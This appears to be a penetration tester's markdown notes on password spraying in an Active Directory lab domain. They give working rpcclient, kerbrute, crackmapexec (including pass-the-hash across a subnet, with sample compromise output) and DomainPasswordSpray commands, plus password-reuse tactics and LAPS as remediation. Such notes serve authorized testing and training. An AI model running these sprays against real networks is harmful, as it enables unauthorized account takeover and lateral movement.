### Content
- [From Internal Linux Host](#from-internal-linux-host)
- [From Internal Windows Host](#from-internal-windows-host)
---
we must always keep a log of our activities, including, but not limited to:
- The accounts targeted
- Domain Controller used in the attack
- Time of the spray
- Date of the spray
- Password(s) attempted

> [!Note]
> When working with local administrator accounts, one consideration is password re-use or common password formats across accounts.
> 
> If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers.
> Also, if we find non-standard local administrator accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account.
> The same principle may apply to domain accounts. If we retrieve the password for a user named `ajones`, it is worth trying the same password on their admin account (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords.
> This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
> 
> One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.



---
### From Internal Linux Host

``` bash
# Using rpcclient
# After preparing valid usernames list and choose a password 
$ pass=12345%!2
$ for u in $(cat valid_users.txt);do rpcclient -U '$u%$pass' -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Using kerbrute
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  $pass

# Using crackmapexec
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p $pass | grep +

# passwordspray all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    MX01  [+] MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    MS01  [+] MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    WEB0  [+] WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)



# Validating the Credentials with CrackMapExec
$ sudo crackmapexec smb 172.16.5.5 -u $username -p $password
```
---
### From Internal Windows Host

[DomainPasswordSpray](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/refs/heads/master/DomainPasswordSpray.ps1) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

``` Powershell
PS C:\> Import-Module .\DomainPasswordSpray.ps1
PS C:\> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```